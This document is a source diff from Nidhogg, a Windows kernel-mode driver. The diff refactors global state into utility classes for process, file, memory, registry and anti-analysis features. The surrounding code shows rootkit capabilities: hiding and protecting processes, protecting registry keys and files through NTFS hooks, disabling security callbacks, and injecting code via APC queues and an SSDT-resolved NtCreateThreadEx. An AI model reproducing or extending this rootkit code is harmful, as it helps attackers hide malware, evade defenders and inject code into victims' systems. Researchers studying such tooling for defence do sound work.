@@ -102,7 +102,7 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 			Features.ThreadProtection = false;
 		}
 
-		status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &rGlobals.RegCookie, nullptr);
+		status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &NidhoggRegistryUtils->RegCookie, nullptr);
 
 		if (!NT_SUCCESS(status)) {
 			KdPrint((DRIVER_PREFIX "Failed to register registry callback: (0x%08X)\n", status));
@@ -138,7 +138,7 @@ void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 	KdPrint((DRIVER_PREFIX "Unloading...\n"));
 
 	if (Features.RegistryFeatures) {
-		NTSTATUS status = CmUnRegisterCallback(rGlobals.RegCookie);
+		NTSTATUS status = CmUnRegisterCallback(NidhoggRegistryUtils->RegCookie);
 
 		if (!NT_SUCCESS(status)) {
 			KdPrint((DRIVER_PREFIX "Failed to unregister registry callbacks: (0x%08X)\n", status));
@@ -187,58 +187,11 @@ NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
 * There is no return value.
 */
 void ClearAll() {
-	// Clearing the process array.
-	AutoLock processProtectingLocker(pGlobals.Lock);
-
-	memset(&pGlobals.ProtectedProcesses.Processes, 0, sizeof(pGlobals.ProtectedProcesses.Processes));
-	pGlobals.ProtectedProcesses.PidsCount = 0;
-
-	for (int i = 0; i < pGlobals.HiddenProcesses.PidsCount; i++) {
-		pGlobals.HiddenProcesses.Processes[i].ListEntry = NULL;
-		pGlobals.HiddenProcesses.Processes[i].Pid = 0;
-	}
-	pGlobals.HiddenProcesses.PidsCount = 0;
-
-	// Clearing the thread array.
-	AutoLock threadProtectingLocker(tGlobals.Lock);
-
-	memset(&tGlobals.ProtectedThreads.Threads, 0, sizeof(tGlobals.ProtectedThreads.Threads));
-	tGlobals.ProtectedThreads.TidsCount = 0;
-
-	// Clearing the files array.
-	AutoLock filesLocker(fGlobals.Lock);
-
-	for (int i = 0; i < fGlobals.Files.FilesCount; i++) {
-		ExFreePoolWithTag(fGlobals.Files.FilesPath[i], DRIVER_TAG);
-		fGlobals.Files.FilesPath[i] = nullptr;
-		fGlobals.Files.FilesCount--;
-	}
-
-	// Uninstalling NTFS hooks if there are any.
-	if (fGlobals.Callbacks[0].Activated)
-		UninstallNtfsHook(IRP_MJ_CREATE);
-
-	// Clearing the registry keys and values.
-	AutoLock registryLocker(rGlobals.Lock);
-
-	for (int i = 0; i < rGlobals.ProtectedItems.Keys.KeysCount; i++) {
-		ExFreePoolWithTag(rGlobals.ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
-		rGlobals.ProtectedItems.Keys.KeysPath[i] = nullptr;
-	}
-	rGlobals.ProtectedItems.Keys.KeysCount = 0;
-
-	for (int i = 0; i < rGlobals.ProtectedItems.Values.ValuesCount; i++) {
-		ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
-		ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
-		rGlobals.ProtectedItems.Values.ValuesPath[i] = nullptr;
-		rGlobals.ProtectedItems.Values.ValuesName[i] = nullptr;
-	}
-	rGlobals.ProtectedItems.Values.ValuesCount = 0;
-
-	// Clearing the anti analysis tampered callbacks.
-	AutoLock antianalysisLocker(aaGlobals.Lock);
-	memset(aaGlobals.DisabledCallbacks, 0, sizeof(aaGlobals.DisabledCallbacks));
-	aaGlobals.DisabledCallbacksCount = 0;
+	delete NidhoggProccessUtils;
+	delete NidhoggFileUtils;
+	delete NidhoggMemoryUtils;
+	delete NidhoggAntiAnalysis;
+	delete NidhoggRegistryUtils;
 }
 
 /*
@@ -252,12 +205,13 @@ void ClearAll() {
 * There is no return value.
 */
 void InitializeFeatures() {
-	// Initialize globals.
-	tGlobals.Init();
-	pGlobals.Init();
-	fGlobals.Init();
-	rGlobals.Init();
-	aaGlobals.Init();
+
+	// Initialize utils.
+	NidhoggProccessUtils = new ProcessUtils();
+	NidhoggFileUtils = new FileUtils();
+	NidhoggMemoryUtils = new MemoryUtils();
+	NidhoggAntiAnalysis = new AntiAnalysis();
+	NidhoggRegistryUtils = new RegistryUtils();
 
 	// Get windows version.
 	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
@@ -288,10 +242,6 @@ void InitializeFeatures() {
 	if (!(PULONG)KeInitializeApc || !(PULONG)KeInsertQueueApc || !(PULONG)KeTestAlertThread || !(PULONG)ZwQuerySystemInformation)
 		Features.ApcInjection = false;
 
-	if (NT_SUCCESS(GetSSDTAddress())) {
-		NtCreateThreadEx = (tNtCreateThreadEx)GetSSDTFunctionAddress("NtCreateThreadEx");
-
-		if (NtCreateThreadEx)
-			Features.CreateThreadInjection = true;
-	}
+	if (NidhoggMemoryUtils->FoundNtCreateThreadEx())
+		Features.CreateThreadInjection = true;
 }
